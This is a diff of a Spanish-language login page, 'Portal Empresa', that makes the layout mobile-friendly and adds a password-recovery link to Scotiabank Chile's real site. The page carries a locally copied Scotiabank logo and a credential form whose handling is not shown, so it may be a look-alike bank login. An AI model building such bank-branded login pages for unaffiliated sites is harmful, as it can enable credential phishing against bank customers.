@@ -17,10 +17,10 @@
       top: 0;
       left: 0;
       width: 100%;
-      background: #d32f2f; /* rojo corporativo */
+      background: #d32f2f;
       color: #fff;
       display: flex;
-      justify-content: space-between;
+      justify-content: center; /* centrado en móvil */
       align-items: center;
       padding: 0.5rem 1rem;
       box-shadow: 0 2px 5px rgba(0,0,0,0.2);
@@ -29,27 +29,24 @@
     .top-bar img {
       height: 40px;
     }
-    .top-bar .contact-info {
-      font-size: 0.9rem;
-    }
 
-    /* Contenedor principal debajo de la franja */
+    /* Contenedor principal */
     .main-container {
-      display: flex;
       margin-top: 70px; /* espacio para la franja fija */
-      height: calc(100vh - 70px);
+      display: flex;
+      flex-direction: column; /* móvil: apilado */
       align-items: center;
-      justify-content: center;
+      padding: 1rem;
     }
 
     .form-side {
-      flex: 1;
-      padding: 2rem;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
       background: #fff;
+      padding: 2rem;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      width: 100%;
       max-width: 400px;
+      margin-bottom: 1rem;
     }
     .form-side h2 {
       color: #d32f2f;
@@ -85,23 +82,36 @@
     .btn:hover {
       background: #b71c1c;
     }
-    .message {
-      margin-top: 1rem;
+    .extra-link {
       text-align: center;
+      margin-top: 0.8rem;
+    }
+    .extra-link a {
+      color: #d32f2f;
+      text-decoration: none;
       font-size: 0.9rem;
-      color: #555;
+    }
+    .extra-link a:hover {
+      text-decoration: underline;
     }
 
-    .image-side {
-      flex: 1;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      background: #f4f4f4;
-    }
     .image-side img {
       max-width: 100%;
       height: auto;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+
+    /* Versión escritorio: formulario e imagen lado a lado */
+    @media (min-width: 768px) {
+      .main-container {
+        flex-direction: row;
+        justify-content: center;
+        align-items: flex-start;
+      }
+      .form-side {
+        margin-right: 2rem;
+      }
     }
   </style>
 </head>
@@ -109,14 +119,11 @@
   <!-- Franja superior -->
   <div class="top-bar">
     <img src="main/ScotiaLogo.svg" alt="Logo Empresa">
-    <div class="contact-info">
-      📧 contacto@empresa.cl | ☎ +56 2 1234 5678
-    </div>
   </div>
 
   <!-- Contenido principal -->
   <div class="main-container">
-    <!-- Formulario a la izquierda -->
+    <!-- Formulario -->
     <div class="form-side">
       <h2>Portal Empresa</h2>
       <form id="loginForm">
@@ -134,10 +141,15 @@
         </div>
         <button type="submit" class="btn">Ingresar</button>
       </form>
+      <div class="extra-link">
+        <a href="https://banco.scotiabank.cl/mfe-login/scotia?c=-Jm7twBoTk8r5JxsG9yQxvyBzYuj9zPzbqKzZGvVa5vWeXygMBZdA_6hy2MsHa_iNlH3e119igob0K7rFv4Y78Ed8U06fo1G887umLNUOM4#modal-recovery" target="_blank">
+          Olvidó su clave / No tiene clave?
+        </a>
+      </div>
       <div class="message" id="message"></div>
     </div>
 
-    <!-- Imagen fija a la derecha -->
+    <!-- Imagen aviso -->
     <div class="image-side">
       <img src="aviso-ggee.jpg" alt="Aviso Empresa">
     </div>
